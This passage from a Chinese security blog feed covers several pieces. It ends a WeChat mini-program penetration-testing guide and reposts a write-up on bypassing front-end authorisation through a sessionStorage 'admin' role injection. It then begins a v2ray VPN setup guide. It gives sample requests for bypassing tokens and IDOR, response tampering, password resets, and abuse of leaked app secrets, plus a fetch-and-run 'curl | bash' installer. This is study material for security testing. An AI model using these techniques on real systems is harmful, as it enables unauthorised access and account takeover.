<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149812.png" alt="图片"></p>
<p>验证登录成功。这类常常出现未授权漏洞的路由命名方式大抵都是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xxxByXXXId</span><br><span class="line">xxxByUsername</span><br><span class="line">xxxbyphone</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>审计的时候我们可以做一个规则去全局搜索源码匹配这类命名方式的路由</p>
<h2 id="0x04其他类型漏洞案例"><a href="#0x04其他类型漏洞案例" class="headerlink" title="0x04其他类型漏洞案例"></a>0x04其他类型漏洞案例</h2><hr>
<h3 id="自动化查找信息泄露和未授权接口-个人补充"><a href="#自动化查找信息泄露和未授权接口-个人补充" class="headerlink" title="自动化查找信息泄露和未授权接口 (个人补充)"></a>自动化查找信息泄露和未授权接口 (个人补充)</h3><blockquote>
<p>对于下方的手工寻找信息泄露漏洞和未授权漏洞，代码审计需要手工，我有更加自动化快捷的查找方法</p>
</blockquote>
<ol>
<li>利用 <code>Packer-Fuzzer</code>  查找</li>
</ol>
<blockquote>
<p>项目地址：<a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a></p>
</blockquote>
<p>这种方式首先目标站点是 webpack 打包的站点，识别是否是 webpack 技术打包的也很简单，查看源代码，比如这样：</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220419154109255.png" alt="image-20220419154109255" style="zoom:50%;" />

<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/微信小程序渗透/image-20220419154158844.png" alt="image-20220419154158844" style="zoom:50%;" />

<p>这种点击源代码，几乎没有 html 代码的就是了</p>
<p>优点是：结果报告友好、简洁。</p>
<ol start="2">
<li>利用 <code> JSFinder</code> 查找</li>
</ol>
<blockquote>
<p>项目地址：<a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
</blockquote>
<p>这种方法直接使用 <code>-u </code>命令指定 url 来搜索 js 中的链接即可。微信小程序都有一个对用的 url，url 在 burpsuite 抓包中获得，直接复制到浏览器上打开，如果能正常打开即可。</p>
<p>优点是：不需要是 webpack 打包的站点。</p>
<ol start="3">
<li>微信小程序信息在线收集，wxapkg源码包内提取信息</li>
</ol>
<p><a href="https://github.com/moyuwa/wechat_appinfo_wxapkg">https://github.com/moyuwa/wechat_appinfo_wxapkg</a></p>
<hr>
<p>下面举例其他类型的漏洞审计案例，这里目的是为了说明小程序有哪些漏洞可以挖</p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>反编译出来的源码泄露登录账号密码，这里是因为在 js 文件中写死了账号密码，只做了前端验证导致的漏洞，从下面贴的两个小程序源码中可以看到</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149913.png" alt="图片"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149914.png" alt="图片"></p>
<p>在时间稍稍往前的小程序中，还经常会有泄露小程序<code>secret</code>的情况，简直就是把打开保险箱的密码放在你面前</p>
<h3 id="未授权接口"><a href="#未授权接口" class="headerlink" title="未授权接口"></a>未授权接口</h3><p>仔细翻找 js 文件能找到不少未鉴权的 api 接口（可以着重注意配置文件，不少配置文件都会写上路由列表），例如该 api 返回大量用户敏感信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149915.png" alt="图片"></p>
<p>测试未授权时，有一些小技巧：例如当在 GET 或者 POST 传参中有<code>token</code>等鉴权参数，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /api/GetUserInfo?id=xxx&amp;token=xxxx HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>可以尝试将<code>token</code>参数的值置空或者删除<code>token</code>参数，往往能 bypass 鉴权，我已经遇见好多次这种情况了。举例一个案例：<br>该微信小程序可以注册用户，注册账号登录之后抓包，我的账号数据包如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /wx/queryOrders?orderState=&amp;serviceUid=&amp;repairUid=6864&amp;pageNum=1&amp;pageSize=20&amp;uid=6864&amp;token=9938C366-XXXX-XXXX-XXXX-9C7709D8C9E8</span><br></pre></td></tr></table></figure>

<p>当我尝试将<code>uid</code>参数改成其他用户时，返回权限不足，尝试将<code>token</code>删除</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /wx/queryOrders?orderState=&amp;serviceUid=&amp;pageNum=1&amp;pageSize=200&amp;uid=2000</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149916.png" alt="图片"></p>
<p>除此之外，测试一些参数，比如手机号，不知道该系统用户手机号时，可以试试像上面说的将其置空，往往运气好能碰上系统后端查询使用的模糊查询为空时返回所有信息，下面贴图的案例就是将手机号参数置空后，成功获取到账号详细信息</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149917.png" alt="图片"></p>
<h3 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h3><p>下面案例举例一个通过 Cookie 中的参数进行鉴权的漏洞，可以通过修改<code>NetId</code>中的值来遍历获取用户信息。此类漏洞的挖掘在鉴权处的源码，审计时可以着重审计其验证流程</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149918.png" alt="图片"></p>
<p>当时也是依靠这个漏洞获取到 VPN 账号密码，得以进入内网渗透</p>
<h3 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h3><p>使用 burpsuite 抓取管理员登录数据包，获取返回包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149919.png" alt="图片"></p>
<p>该处在<code>login.js</code>文件登录判断条件中，源码判断返回为 0 时登录成功，所以我们将返回包从 1 改成 0 即可登录成功。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149920.png" alt="图片"></p>
<p>还有 任意密码重置 ，该处漏洞倒也是在黑盒中无意发现，在修改密码处需要验证对应账号接收到的短信验证码。但怀着尝试的心态通过 buspsuite 抓包绕过 js 限制，随意填写验证码便可以重置任意用户密码，不细心就会很容易忽视的点</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149921.png" alt="图片"></p>
<h3 id="appid和secret的利用"><a href="#appid和secret的利用" class="headerlink" title="appid和secret的利用"></a>appid和secret的利用</h3><p>当时测试数据的时候，发现添加字符<code>%%</code>会导致其后端报错，返回<code>appid</code>和<code>secret</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862149922.png" alt="图片"></p>
<p>获取到的appid和secret可以到微信的官方接口去自由生成微信小程序的命脉<code>AccessToken</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862150023.png" alt="图片"></p>
<p>拿到 AccessToken，相当于可以控制整个小程序了，并且 AccessToken 微信每天只能生成20次，不断请求满20次的话可以使小程序崩溃无法使用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/640-164873862150024.png" alt="图片"></p>
<p>其次利用AccessToken可以执行相当多的其他操作，见微信官方文档，这里就不画蛇添足了。</p>
<p>工具自取链接：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">链接：https://pan.baidu.com/s/1vMVvmm2n2wyr3vhzp91iqA </span><br><span class="line">提取码：jpho</span><br></pre></td></tr></table></figure>

<blockquote>
<p>因为百度网盘下载速度感人，我在这里补充一个个人的阿里云盘链接分享，然后在夜神模拟器里面自行下载 微信8.0 即可</p>
<p> 链接：<a href="https://www.aliyundrive.com/s/SvTBaQwJK3S">https://www.aliyundrive.com/s/SvTBaQwJK3S</a></p>
</blockquote>
<h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>初步学会了微信小程序的渗透。技能+1。</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>微信小程序</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次 bypass 前端验证 + 后端缺陷</title>
    <url>/posts/72a820ee.html</url>
    <content><![CDATA[<blockquote>
<p>编者注：F12 大法挺有用的，但如果后端校验 session，就没什么用了。</p>
</blockquote>
<p>转载自：<a href="https://forum.butian.net/share/198">https://forum.butian.net/share/198</a></p>
<h3 id="0x00-故事的开始"><a href="#0x00-故事的开始" class="headerlink" title="0x00 故事的开始"></a>0x00 故事的开始</h3><p>有人找到我,搞攻防请求支援,当然这种请求那当然要逝世呀</p>
<h3 id="0x01-开始渗透"><a href="#0x01-开始渗透" class="headerlink" title="0x01 开始渗透"></a>0x01 开始渗透</h3><p>发了一堆站,有ip有域名</p>
<p>我搞了一晚上啥都没发现,本来想挖挖越权啥的</p>
<p>早上起来用jsFinder扫描,说不定有什么接口泄露呢</p>
<p>结果还真扫到了一堆,一看就看到了一些不得了的东西</p>
<p>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f5ccd9977a5ff93a3ceed7303c7ad840d.jpg)</p>
<p>getAllUsers,deleteuser等<br>尝试访问一个接口发现报错<br>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f827054bbb51d06b0a8de1ce148bed7c9.jpg)</p>
<p>有可能是未授权!,赶紧构造一下参数</p>
<p>分析js后需要两个参数</p>
<p>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fa027cd9e966233cf428f9a0c76ee999e.jpg)</p>
<p>随便构造了一下出现了所有人的信息但是密码全部md5加密了,尝试解密了一下解不出来,size表示显示的字节</p>
<p>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f2fea8273446b105abf835829c109707a.jpg)</p>
<p>接下来要想办法进入后台进行更多的操作,因为构造参数什么的太麻烦了,他的大部分参数都rsa加密过</p>
<p>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f61b37b0acf3423f6b29364d5183d25e3.jpg)</p>
<p>尝试修改过登入的返回包也没用</p>
<p>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f06da5e5fc1297dbac4f0efb70ea4ddb8.jpg)</p>
<p>改为0表示成功</p>
<p>![image-20210604174516077](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fcc2bac4f82f0107478b1cf0c016bd8fe.jpg)</p>
<p>发现并没有用</p>
<p>![image-20210604174618827](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fa6055eb09a28d650a48a0f18577d098d.jpg)</p>
<p>如果换做以前的我,我会放弃,但是！我遇到了龙哥(前端代码审计的神)</p>
<h3 id="0x02开始反转"><a href="#0x02开始反转" class="headerlink" title="0x02开始反转"></a>0x02开始反转</h3><p>![image-20210604174901464](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f47a1ef53b37eb4ac9ae55f3f8bf09810.jpg)</p>
<p>![image-20210604175102543](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fc055e6447d8b1e6d313822e6e77dea06.jpg)</p>
<p>找到了js判断是否登入后台的地方</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">switch</span> (e.<span class="property">prev</span> = e.<span class="property">next</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> (T.<span class="property">a</span>.<span class="title function_">start</span>(),</span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">title</span> = <span class="title function_">j</span>(t.<span class="property">m</span> eta.<span class="property">title</span>),</span><br><span class="line">                i = O <span class="title function_">bject</span>(P[&amp;quot;a&amp;quot;])(), !i) &#123;</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">9</span>;</span><br><span class="line">                sessionStorage.<span class="title function_">setItem</span>(&amp;quot;user&amp;quot;, <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123; &amp;quot;userRole&amp;quot;: &amp;quot;admin&amp;quot; &#125;))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (&amp;quot;/login&amp;quot; !== t.<span class="property">path</span>) &#123;</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">9</span>;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_">o</span>(&#123;</span><br><span class="line">                    <span class="attr">path</span>: &amp;quot;/&amp;quot;</span><br><span class="line">                &#125;),</span><br><span class="line">                T.<span class="property">a</span>.<span class="title function_">done</span>(),</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">28</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="keyword">if</span> (r = p[&amp;quot;a&amp;quot;].<span class="property">getters</span>.<span class="property">name</span>, !r) &#123;</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">15</span>;</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            &#125;</span><br><span class="line">            s = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(sessionStorage.<span class="title function_">getItem</span>(&amp;quot;user&amp;quot;)),</span><br><span class="line">                &amp;quot;admin&amp;quot; == s.<span class="property">userRole</span> &amp;amp;&amp;amp; &amp;quot;/bg_userManage&amp;quot; !== t.<span class="property">path</span> ? (O <span class="title function_">bject</span>(a[&amp;quot;<span class="title class_">Message</span>&amp;quot;])(&#123;</span><br><span class="line">                        <span class="attr">message</span>: &amp;quot;只有用户管理的权限&amp;quot;,</span><br><span class="line">                        <span class="attr">type</span>: &amp;quot;warning&amp;quot;,</span><br><span class="line">                        <span class="attr">duration</span>: <span class="number">5e3</span></span><br><span class="line">                    &#125;),</span><br><span class="line">                    <span class="title function_">o</span>(&#123;</span><br><span class="line">                        <span class="attr">path</span>: &amp;quot;/bg_userManage&amp;quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">                    T.<span class="property">a</span>.<span class="title function_">done</span>()) : &amp;quot;audit&amp;quot; == s.<span class="property">userRole</span> &amp;amp;&amp;amp; &amp;quot;/bg_logManage&amp;quot; !== t.<span class="property">path</span> ? (O <span class="title function_">bject</span>(a[&amp;quot;<span class="title class_">Message</span>&amp;quot;])(&#123;</span><br><span class="line">                        <span class="attr">message</span>: &amp;quot;只有日志管理的权限&amp;quot;,</span><br><span class="line">                        <span class="attr">type</span>: &amp;quot;warning&amp;quot;,</span><br><span class="line">                        <span class="attr">duration</span>: <span class="number">5e3</span></span><br><span class="line">                    &#125;),</span><br><span class="line">                    <span class="title function_">o</span>(&#123;</span><br><span class="line">                        <span class="attr">path</span>: &amp;quot;/bg_logManage&amp;quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">                    T.<span class="property">a</span>.<span class="title function_">done</span>()) : &amp;quot;user&amp;quot; != s.<span class="property">userRole</span> || &amp;quot;<span class="regexp">/bg_logManage&amp;quot; !== t.path &amp;amp;&amp;amp; &amp;quot;/</span>bg_userManage&amp;quot; !== t.<span class="property">path</span> ? (<span class="title function_">o</span>(),</span><br><span class="line">                    T.<span class="property">a</span>.<span class="title function_">done</span>()) : (<span class="title function_">o</span>(&#123;</span><br><span class="line">                        <span class="attr">path</span>: &amp;quot;/<span class="number">404</span>&amp;quot;</span><br><span class="line">                    &#125;),</span><br><span class="line">                    T.<span class="property">a</span>.<span class="title function_">done</span>()),</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">28</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">15</span>:</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">prev</span> = <span class="number">15</span>,</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">18</span>,</span><br><span class="line">                p[&amp;quot;a&amp;quot;].<span class="title function_">dispatch</span>(&amp;quot;user/getInfo&amp;quot;);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">18</span>:</span><br><span class="line">            <span class="title function_">o</span>(),</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">28</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">            <span class="keyword">return</span> e.<span class="property">prev</span> = <span class="number">21</span>,</span><br><span class="line">                e.<span class="property">t0</span> = e[&amp;quot;<span class="keyword">catch</span>&amp;quot;](<span class="number">15</span>),</span><br><span class="line">                e.<span class="property">next</span> = <span class="number">25</span>,</span><br><span class="line">                p[&amp;quot;a&amp;quot;].<span class="title function_">dispatch</span>(&amp;quot;user/resetToken&amp;quot;);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">            a[&amp;quot;<span class="title class_">Message</span>&amp;quot;].<span class="title function_">error</span>(e.<span class="property">t0</span> || &amp;quot;<span class="title class_">Has</span> <span class="title class_">Error</span>&amp;quot;),</span><br><span class="line">                <span class="title function_">o</span>(&amp;quot;/login?redirect=&amp;quot;.<span class="title function_">concat</span>(t.<span class="property">path</span>)),</span><br><span class="line">                T.<span class="property">a</span>.<span class="title function_">done</span>();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">            e.<span class="property">next</span> = <span class="number">31</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">30</span>:</span><br><span class="line">            -<span class="number">1</span> !== z.<span class="title function_">indexOf</span>(t.<span class="property">path</span>) ? (T.<span class="property">a</span>.<span class="title function_">done</span>(),</span><br><span class="line">                <span class="title function_">o</span>()) : (-<span class="number">1</span> !== n.<span class="property">path</span>.<span class="title function_">indexOf</span>(&amp;quot;<span class="regexp">/non_visitor&amp;quot;) ? o(&amp;quot;/</span>dashboard&amp;quot;) : <span class="title function_">o</span>(n.<span class="property">path</span>),</span><br><span class="line">                p[&amp;quot;a&amp;quot;].<span class="title function_">commit</span>(&amp;quot;user/<span class="variable constant_">SET_LOGINWINDOWSTATE</span>&amp;quot;),</span><br><span class="line">                T.<span class="property">a</span>.<span class="title function_">done</span>());</span><br><span class="line">        <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">        <span class="keyword">case</span> &amp;quot;end&amp;quot;:</span><br><span class="line">            <span class="keyword">return</span> e.<span class="title function_">stop</span>()</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>使用f12断点进行Dbug调试</p>
<p>![image-20210604175501133](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f942c0485be488acb7cfdd12db8e240d1.jpg)</p>
<p>发现是走到了0</p>
<p>![image-20210604175537414](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f2e1a0069b91f5c9f947bf41bc1d45f61.jpg)</p>
<p>然后赋值了30,因为是while (1)所以跳到了30后面就直接结束了</p>
<p>![image-20210604175647519](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f37aecb69544fe379e22591ca86c109bc.jpg)</p>
<p>注意到了9,感觉就是后台页面,我们只需要想办法进到9里面就可以了</p>
<p>![image-20210604175807700](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fa15cd9492e7894f152d3c9dba887f6d4.jpg)</p>
<p>尝试重新调试</p>
<p>只需要在他赋值30的完事后在重新赋值覆盖掉他的值</p>
<p>![image-20210604175943529](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f6e43b16610a43b558f8a8f8afbb00090.jpg)</p>
<p>然后不就会跳转到9了?</p>
<p>确实,成功跳到了9</p>
<p>![image-20210604180037854](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fed9d06a60ab6f98ab09ee3d90229af37.jpg)</p>
<p>第一个if没有进,不管他看下面的s.userRole,而s又等于JSON.parse(sessionStorage.getItem(“user”))</p>
<p>![image-20210604180348622](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f403d5abf746ab93dd4ab86828fcf1271.jpg)</p>
<p>直接在这个地方赋值s.userRole&#x3D;”admin”发现报错,请求了龙哥</p>
<h3 id="0x03白热化阶段"><a href="#0x03白热化阶段" class="headerlink" title="0x03白热化阶段"></a>0x03白热化阶段</h3><p>![image-20210604180522104](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f4751f2b8b687d311b0121aa963cf4116.jpg)</p>
<p>![image-20210604180545776](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f89172ae67452b6b42b760044a25a759a.jpg)</p>
<p>![image-20210604180635111](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f3eb9ea87550c4c56b3ac8b9560a8f499.jpg)</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">sessionStorage.<span class="title function_">setItem</span>(&amp;quot;user&amp;quot;,<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;&amp;quot;userRole&amp;quot;:&amp;quot;admin&amp;quot;&#125;))</span><br></pre></td></tr></table></figure>

<p>他这里先构造一个userRole&#x3D;admin的json然后在进行写入本地的sessionStorage?</p>
<p>前面搞定了只需要把path路径改为bg_userManage就可以查看了</p>
<p>![image-20210604181200037](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f12f6de304ce7d588f72c9aa463a5a11f.jpg)</p>
<p>成功进来了这个判断:</p>
<p>![image-20210604181409145](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f558a8410005642cc0d45a885ff84f55f.jpg)</p>
<p>查看后台:</p>
<p>![img](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f2c998612ec22a2abb85796661abda6ba.jpg)</p>
<p>尝试添加一个账号</p>
<p>![image-20210604181657503](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f56be07092ce838e9f24f77635964c8f8.jpg)</p>
<p>果然,rsa加密了,如果我不进后台,拿头给他构造</p>
<p>![image-20210604181820472](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f4a8b385c6b919fec86761d3d6d230a5e.jpg)</p>
<p>登入就完事了</p>
<p>![image-20210604182027341](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f471d2e1c3569fb247a474397a0dd921a.jpg)</p>
<p>第一次登入需要修改密码:</p>
<p>![image-20210604182104210](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f9b936e7dce3544f1fe66dcc123517072.jpg)</p>
<p>尝试直接修改别的用户的密码:</p>
<p>![image-20210604182155268](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f2e6bc5663c660cf75ab54f8f2193d1a1.jpg)</p>
<p>结果真的可以修改</p>
<p>登入后的页面就不展示了,全是水印根本码不过来</p>
<h3 id="0x04推荐"><a href="#0x04推荐" class="headerlink" title="0x04推荐"></a>0x04推荐</h3><p>推荐浏览器插件reres</p>
<p>可以把网站的js下载到本地进行本地加载(实现修改js的目的,省的dbug修改)</p>
<p>![image-20210604182851612](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;f767f6949d1f78f418f52549de6b4e3ec.jpg)</p>
<p>可以直接在0的地方修改</p>
<p>![image-20210604182948940](..&#x2F;imgs&#x2F;记一次 bypass 前端验证 + 后端缺陷&#x2F;fb161307964a9f0ed6bc0fb9922740b7e.jpg)</p>
<p>就不用每一次dbug了</p>
<h3 id="0x05结尾"><a href="#0x05结尾" class="headerlink" title="0x05结尾"></a>0x05结尾</h3><p>以后渗透要多看看js,接口什么,实现真正的从0到1</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>F12</tag>
      </tags>
  </entry>
  <entry>
    <title>搭建 v2ray VPN 服务器</title>
    <url>/posts/a929fdeb.html</url>
    <content><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>需要准备好一台 ubuntu&#x2F;debian vps，vps 一般不使用大厂的 firewall 来进行配置，而是使用我们自己的 ufw 来配置，准备好环境：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install ufw</span><br><span class="line">apt install curl</span><br></pre></td></tr></table></figure>

<p>在本地计算机安装 v2rayN</p>
<p>下载地址：</p>
<p><a href="https://github.com/2dust/v2rayN/releases/">https://github.com/2dust/v2rayN/releases/</a></p>
<p> 找到 v2rayN-Core.zip 下载</p>
<h2 id="0x01-搭建-v2ray-服务端"><a href="#0x01-搭建-v2ray-服务端" class="headerlink" title="0x01 搭建 v2ray 服务端"></a>0x01 搭建 v2ray 服务端</h2><p>使用 远程ssh登录软件登录你的 vps 之后，执行命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -s -L https://git.io/v2ray.sh)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>如果提示没有安装 curl，centos 使用命令 yum install curl 安装，ubuntu&#x2F;debian 使用</p>
<p>apt install curl 安装</p>
</blockquote>
<p>出现提示，选择 1 安装。</p>
<p>其他的直接默认，一路按回车键即可。</p>
<p>出现以下页面说明安装成功。</p>
<img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../imgs/搭建v2rayVPN服务器/image-20220413162619742.png" alt="image-20220413162619742" style="zoom:50%;" />

<p>放行 v2ray 的端口号：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ufw allow port</span><br></pre></td></tr></table></figure>



<h2 id="0x02-优化-v2ray-服务器"><a href="#0x02-优化-v2ray-服务器" class="headerlink" title="0x02 优化 v2ray 服务器"></a>0x02 优化 v2ray 服务器</h2><p>输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v2ray bbr </span><br></pre></td></tr></table></figure>

<p>选择 1 安装</p>
